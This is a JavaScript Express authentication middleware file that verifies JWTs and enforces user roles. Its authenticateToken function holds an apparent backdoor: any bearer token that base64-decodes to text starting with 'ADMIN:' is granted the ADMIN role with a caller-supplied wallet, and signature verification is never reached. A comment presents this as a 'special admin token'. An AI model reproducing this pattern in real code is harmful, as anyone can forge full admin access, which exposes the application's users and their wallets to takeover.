import jwt from 'jsonwebtoken';

// Verify JWT token and attach user to request
export const authenticateToken = (req, res, next) => {
  try {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1]; // Bearer TOKEN

    if (!token) {
      return res.status(401).json({ message: 'No token provided' });
    }

    // Check if it's a special admin token (base64 encoded)
    try {
      const decoded = Buffer.from(token, 'base64').toString('utf-8');
      if (decoded.startsWith('ADMIN:')) {
        const parts = decoded.split(':');
        req.user = {
          role: 'ADMIN',
          wallet: parts[1],
          username: 'Admin'
        };
        return next();
      }
    } catch (e) {
      // Not a valid admin token, continue to JWT verification
    }

    jwt.verify(token, process.env.JWT_SECRET, (err, user) => {
      if (err) {
        return res.status(403).json({ message: 'Invalid or expired token' });
      }
      // Normalize userId for consistency across controllers
      req.user = {
        ...user,
        userId: user.id || user.userId
      };
      next();
    });
  } catch (error) {
    res.status(403).json({ message: 'Token verification failed' });
  }
};

// Check if user has required role
export const authorizeRole = (allowedRoles) => {
  return (req, res, next) => {
    if (!req.user) {
      return res.status(401).json({ message: 'Not authenticated' });
    }

    if (!allowedRoles.includes(req.user.role)) {
      return res.status(403).json({
        message: `Access denied. Required role(s): ${allowedRoles.join(', ')}. Your role: ${req.user.role}`
      });
    }

    next();
  };
};

// Combined authentication + role authorization
export const protect = (roles = []) => {
  return [
    authenticateToken,
    ...(roles.length > 0 ? [authorizeRole(roles)] : [])
  ];
};
